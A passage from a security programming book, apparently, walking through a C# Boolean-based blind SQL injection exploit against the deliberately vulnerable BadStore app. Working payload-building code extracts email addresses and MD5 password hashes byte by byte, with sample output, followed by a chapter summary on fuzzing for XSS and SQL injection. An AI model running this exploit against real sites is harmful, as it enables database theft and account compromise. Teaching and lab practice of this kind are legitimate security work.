  type: TYPE_NORMAL
- en: response = reader.ReadToEnd();
  id: totrans-580
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-581
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: return response;
  id: totrans-582
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-583
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-46: The  MakeRequest()  method sending the payload and returning
    the server’s response'
  id: totrans-584
  prefs: []
  type: TYPE_NORMAL
- en: We create a basic GET HttpWebRequest ➋ using the payload and URL ➊ to the BadStore
    instance. Then, using a StreamReader ➌, we read the response into a string and
    return the response to the caller. Now we run the exploit and should receive something
    like the output shown in [Listing 2-47](#filepos226465).
  id: totrans-585
  prefs: []
  type: TYPE_NORMAL
- en: 'There are 23 rows in the userdb table Listing 2-47: Determining the number
    of rows in the  userdb  table'
  id: totrans-586
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: After running the first piece of our exploit, we see we have 23 users to pull
    usernames and password hashes for. The next piece of the exploit will pull out
    the actual usernames and password hashes.
  id: totrans-587
  prefs: []
  type: TYPE_NORMAL
- en: Retrieving the Lengths of the Values
  id: totrans-588
  prefs: []
  type: TYPE_NORMAL
- en: Before we can pull any values from the columns in the database, byte by byte,
    we need to get the lengths of the values. [Listing 2-48](#filepos228309) shows
    how this can be done.
  id: totrans-589
  prefs: []
  type: TYPE_NORMAL
- en: private static int GetLength(int row➊, string column➋)
  id: totrans-590
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-591
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: int countLength = 0;
  id: totrans-592
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: for (;; countLength++)
  id: totrans-593
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-594
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
  id: totrans-595
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getCountLength += " LENGTH(IFNULL(CAST(➌CHAR_LENGTH("+column+") AS";
  id: totrans-596
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getCountLength += " CHAR),0x20)) FROM userdb ORDER BY email ➍LIMIT";
  id: totrans-597
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getCountLength += row+",1)="+countLength+") THEN 0x28 ELSE 0x41 END)) AND";
  id: totrans-598
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getCountLength += " 'YIye'='YIye";
  id: totrans-599
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-600
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string response = MakeRequest(getCountLength);
  id: totrans-601
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-602
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (response.Contains("parentheses not balanced"))
  id: totrans-603
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: break;
  id: totrans-604
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-605
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-48: Retrieving the length of certain values in the database'
  id: totrans-606
  prefs: []
  type: TYPE_NORMAL
- en: 'The GetLength() method takes two arguments: the database row to pull the value
    from ➊ and the database column in which the value will reside ➋. We use a for
    loop (see [Listing 2-49](#filepos230508)) to gather the length of the rows in
    the userdb table. But unlike in the previous SQL payloads, we use the function
    CHAR_LENGTH() ➌ instead of LENGTH because the strings being pulled could be 16-bit
    Unicode instead of 8-bit ASCII. We also use a LIMIT clause ➍ to specify that we
    want to pull the value from a specific row returned from the full users table.
    After retrieving the length of the value in the database, we can retrieve the
    actual value a byte at a time, as shown in [Listing 2-49](#filepos230508).'
  id: totrans-607
  prefs: []
  type: TYPE_NORMAL
- en: List<byte> countBytes = ➊new List<byte> ();
  id: totrans-608
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: for (int i = 0; i <= countLength; i++)
  id: totrans-609
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-610
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: for (int c = 48; c <= 58; c++)
  id: totrans-611
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-612
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string getLength = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
  id: totrans-613
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getLength += " IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM";
  id: totrans-614
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getLength += " userdb ORDER BY email LIMIT " + row + ",1)," + i;
  id: totrans-615
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getLength += ",1))="+c+") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye";
  id: totrans-616
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string response = ➋MakeRequest(getLength);
  id: totrans-617
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (response.➌Contains("parentheses not balanced"))
  id: totrans-618
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-619
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: countBytes.➍Add((byte)c);
  id: totrans-620
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: break;
  id: totrans-621
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-622
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-623
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-624
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-49: The second loop within the  GetLength()  method retrieving the
    actual length of the value'
  id: totrans-625
  prefs: []
  type: TYPE_NORMAL
- en: As you can see in [Listing 2-49](#filepos230508), we create a generic List<byte>
    ➊ to store the values gleaned by the payloads so that we can convert them into
    integers and return them to the caller. As we iterate over the length of the count,
    we send HTTP requests to test the bytes in the value using MakeRequest() ➋ and
    the SQL injection payload. If the response contains the "parentheses not balanced"
    error ➌, we know our SQL payload evaluated to true. This means we need to store
    the value of c (the character that was determined to match i) as a byte ➍ so that
    we can convert the List<byte> to a human-readable string. Since we found the current
    character, we don’t need to test the given index of the count anymore, so we break
    to move on to the next index.
  id: totrans-626
  prefs: []
  type: TYPE_NORMAL
- en: Now we need to return the count and finish the method, as shown in [Listing
    2-50](#filepos232240).
  id: totrans-627
  prefs: []
  type: TYPE_NORMAL
- en: if (countBytes.Count > 0)
  id: totrans-628
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: return ➊int.Parse(Encoding.ASCII.➋GetString(countBytes.ToArray()));
  id: totrans-629
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: else
  id: totrans-630
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: return 0;
  id: totrans-631
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-632
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-50: The final line in the  GetLength()  method, converting the value
    for the length into an integer and returning it'
  id: totrans-633
  prefs: []
  type: TYPE_NORMAL
- en: Once we have the bytes of the count, we can use GetString() ➋ to convert the
    bytes gathered into a human-readable string. This string is passed to int.Parse()
    ➊ and returned to the caller so that we can begin gathering the actual values
    from the database.
  id: totrans-634
  prefs: []
  type: TYPE_NORMAL
- en: Writing GetValue() to Retrieve a Given Value
  id: totrans-635
  prefs: []
  type: TYPE_NORMAL
- en: We finish this exploit with the GetValue() method, as shown in [Listing 2-51](#filepos234548).
  id: totrans-636
  prefs: []
  type: TYPE_NORMAL
- en: private static string GetValue(int row➊, string column➋, int length➌)
  id: totrans-637
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-638
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: List<byte> valBytes = ➍new List<byte>();
  id: totrans-639
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: for (int i = 0; i <= length; i++)
  id: totrans-640
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-641
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ➎for(int c = 32; c <= 126; c++)
  id: totrans-642
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-643
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string getChar = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
  id: totrans-644
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getChar += " IFNULL(CAST("+column+" AS CHAR),0x20) FROM userdb ORDER BY";
  id: totrans-645
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getChar += " email LIMIT "+row+",1),"+i+",1))="+c+") THEN 0x28 ELSE 0x41";
  id: totrans-646
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: getChar += " END)) AND 'YIye'='YIye";
  id: totrans-647
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string response = MakeRequest(getChar);
  id: totrans-648
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-649
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (response.Contains(➏"parentheses not balanced"))
  id: totrans-650
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-651
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: valBytes.Add((byte)c);
  id: totrans-652
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: break;
  id: totrans-653
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-654
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-655
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-656
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: return Encoding.ASCII.➐GetString(valBytes.ToArray());
  id: totrans-657
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-658
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-51: The  GetValue()  method, which will retrieve the value of a given
    column at a given row'
  id: totrans-659
  prefs: []
  type: TYPE_NORMAL
- en: 'The GetValue() method requires three arguments: the database row we are pulling
    the data from ➊, the database column in which the value resides ➋, and the length
    of the value to be gleaned from the database ➌. A new List<byte> ➍ is instantiated
    to store the bytes of the value gathered.'
  id: totrans-660
  prefs: []
  type: TYPE_NORMAL
- en: In the innermost for loop ➎, we iterate from 32 to 126 because 32 is the lowest
    integer that corresponds to a printable ASCII character, and 126 is the highest.
    Earlier when retrieving the counts, we only iterated from 48 to 58 because we
    were only concerned with the numerical ASCII character.
  id: totrans-661
  prefs: []
  type: TYPE_NORMAL
- en: As we iterate through these values, we send a payload comparing the current
    index of the value in the database to the current value of the iteration of the
    inner for loop. When the response is returned, we look for the error "parentheses
    not balanced" ➏ and, if it is found, cast the value of the current inner iteration
    to a byte and store it in the list of bytes. The last line of the method converts
    this list to a string using GetString() ➐ and returns the new string to the caller.
  id: totrans-662
  prefs: []
  type: TYPE_NORMAL
- en: Calling the Methods and Printing the Values
  id: totrans-663
  prefs: []
  type: TYPE_NORMAL
- en: All that is left now is to call the new methods GetLength() and GetValue() in
    our Main() method and to print the values gleaned from the database. As shown
    in [Listing 2-52](#filepos237667), we add the for loop that calls the GetLength()
    and GetValue() methods to the end of our Main() method so that we can extract
    the email addresses and password hashes from the database.
  id: totrans-664
  prefs: []
  type: TYPE_NORMAL
- en: for (int row = 0; row < count; row++)
  id: totrans-665
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-666
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: foreach (string column in new string[] {"email", "passwd"})
  id: totrans-667
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '{'
  id: totrans-668
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Console.Write("Getting length of query value... ");
  id: totrans-669
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: int valLength = ➊GetLength(row, column);
  id: totrans-670
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Console.WriteLine(valLength);
  id: totrans-671
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ''
  id: totrans-672
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Console.Write("Getting value... ");
  id: totrans-673
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string value = ➋GetValue(row, column, valLength);
  id: totrans-674
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Console.WriteLine(value);
  id: totrans-675
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-676
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '}'
  id: totrans-677
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-52: The  for  loop added to the  Main()  method, which consumes the  GetLength()  and  GetValue()  methods'
  id: totrans-678
  prefs: []
  type: TYPE_NORMAL
- en: For each row in the userdb table, we first get the length ➊ and value ➋ of the
    email field and then the value of the passwd field (an MD5 hash of the user’s
    password). Next, we print the length of the field and its value, with results
    like those shown in [Listing 2-53](#filepos239699).
  id: totrans-679
  prefs: []
  type: TYPE_NORMAL
- en: There are 23 rows in the userdb table
  id: totrans-680
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting length of query value... 13
  id: totrans-681
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting value... AAA_Test_User
  id: totrans-682
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting length of query value... 32
  id: totrans-683
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting value... 098F6BCD4621D373CADE4E832627B4F6
  id: totrans-684
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting length of query value... 5
  id: totrans-685
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting value... admin
  id: totrans-686
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting length of query value... 32
  id: totrans-687
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting value... 5EBE2294ECD0E0F08EAB7690D2A6EE69
  id: totrans-688
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: --snip--
  id: totrans-689
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting length of query value... 18
  id: totrans-690
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting value... tommy@customer.net
  id: totrans-691
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting length of query value... 32
  id: totrans-692
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Getting value... 7f43c1e438dc11a93d19616549d4b701
  id: totrans-693
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Listing 2-53: The results of our exploit'
  id: totrans-694
  prefs: []
  type: TYPE_NORMAL
- en: After enumerating the number of users in the database, we iterate over each
    user and pull the username and password hash out of the database. This process
    is much slower than the UNION we performed above, but UNION injections are not
    always available. Understanding how a Boolean-based attack works when exploiting
    SQL injections is crucial to effectively exploiting many SQL injections.
  id: totrans-695
  prefs: []
  type: TYPE_NORMAL
- en: Conclusion
  id: totrans-696
  prefs: []
  type: TYPE_NORMAL
- en: This chapter has introduced you to fuzzing for and exploiting XSS and SQL injection
    vulnerabilities. As you’ve seen, BadStore contains numerous SQL injection, XSS,
    and other vulnerabilities, all of which are exploitable in slightly different
    ways. In the chapter, we implemented a small GET request fuzzing application to
    search query string parameters for XSS or errors that could mean a SQL injection
    vulnerability exists. Using the powerful and flexible HttpWebRequest class to
    make and retrieve HTTP requests and responses, we were able to determine that
    the searchquery parameter, when searching for items in BadStore, is vulnerable
    to both XSS and SQL injection.
  id: totrans-697
  prefs: []
  type: TYPE_NORMAL
- en: Once we wrote a simple GET request fuzzer, we captured an HTTP POST request
    from BadStore using the Burp Suite HTTP proxy and Firefox in order to write a
    small fuzzing application for POST requests. Using the same classes as those in
    the previous GET requests fuzzer, but with some new methods, we were able to find
    even more SQL injection vulnerabilities that could be exploitable.
  id: totrans-698
  prefs: []
  type: TYPE_NORMAL
- en: Next, we moved on to more complicated requests, such as HTTP requests with JSON.
    Using a vulnerable JSON web application, we captured a request used to create
    new users on the web app using Burp Suite. In order to efficiently fuzz this type
    of HTTP request, we introduced the Json.NET library, which makes it easy to parse
    and consume JSON data.
  id: totrans-699
  prefs: []
  type: TYPE_NORMAL
- en: Finally, once you had a good grasp on how fuzzers can find possible vulnerabilities
    in web applications, you learned how to exploit them. Using BadStore again, we
    wrote a UNION-based SQL injection exploit that could pull out the usernames and
    password hashes in the BadStore database with a single HTTP request. In order
    to efficiently pull the extracted data out of the HTML returned by the server,
    we used the regular expression classes Regex, Match, and MatchCollection.
  id: totrans-700
  prefs: []
  type: TYPE_NORMAL
- en: Once the simpler UNION exploit was complete, we wrote a Boolean-based blind
    SQL injection on the same HTTP request. Using the HttpWebRequest class, we determined
    which of the HTTP responses were true or false, based on SQL injection payloads
    passed to the web application. When we knew how the web application would behave
    in response to true-or-false questions, we began asking the database true-or-false
    questions in order to glean information from it 1 byte at a time. The Boolean-based
    blind exploit is more complicated than the UNION exploit and requires more time
    and HTTP requests to complete, but it is particularly useful when a UNION isn’t
    possible.
  id: totrans-701
  prefs: []
  type: TYPE_NORMAL
